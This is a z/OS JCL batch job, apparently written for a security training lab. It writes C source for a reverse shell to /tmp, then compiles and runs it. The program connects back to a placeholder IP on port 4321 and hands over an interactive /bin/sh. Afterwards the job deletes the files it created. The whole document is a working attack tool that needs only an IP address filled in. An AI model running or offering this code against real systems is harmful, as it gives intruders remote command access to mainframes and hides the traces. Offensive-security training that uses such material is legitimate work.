//<USERID>07 JOB (JOB),'Reverse USS C Shell',CLASS=A,MSGCLASS=0,MSGLEVEL=(1,1),
             NOTIFY=&SYSUID
//* Creates a Reverse C shell
//* Change <<YOUR IP>> to your local machine IP address
//* Change <userid> to your assigned lab userid
//CREATECS  EXEC PGM=IEBGENER
//SYSPRINT  DD SYSOUT=*
//SYSIN     DD DUMMY
//SYSUT2    DD PATHOPTS=(ORDWR,OTRUNC,OCREAT),PATHMODE=SIRWXU,
//             PATHDISP=(KEEP,DELETE),
//             FILEDATA=TEXT,
//             PATH='/tmp/<userid>.c'
//SYSUT1    DD DATA,DLM=##
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
int main(int argc, char *argv[])
{
 int i , sockfd;
 struct sockaddr_in sin;
 sockfd = socket(AF_INET,SOCK_STREAM,0);
 sin.sin_family = AF_INET;
 sin.sin_addr.s_addr=inet_addr("<<YOUR IP>>");
 sin.sin_port=htons(4321);
 connect(sockfd,(struct sockaddr *)&sin,sizeof(struct sockaddr_in));
 dup2(sockfd,2);
 dup2(sockfd,1);
 dup2(sockfd,0);
 printf("Evil Mainframe Shell\n");
 execl("/bin/sh","sh",NULL);
return EXIT_SUCCESS;
}
##
//OMGLOL    EXEC PGM=BPXBATCH,REGION=800M
//STDPARM   DD *
SH cd /tmp;
cc -o /tmp/<userid> /tmp/<userid>.c;
/tmp/<userid>;
rm /tmp/<userid>.*;
/*
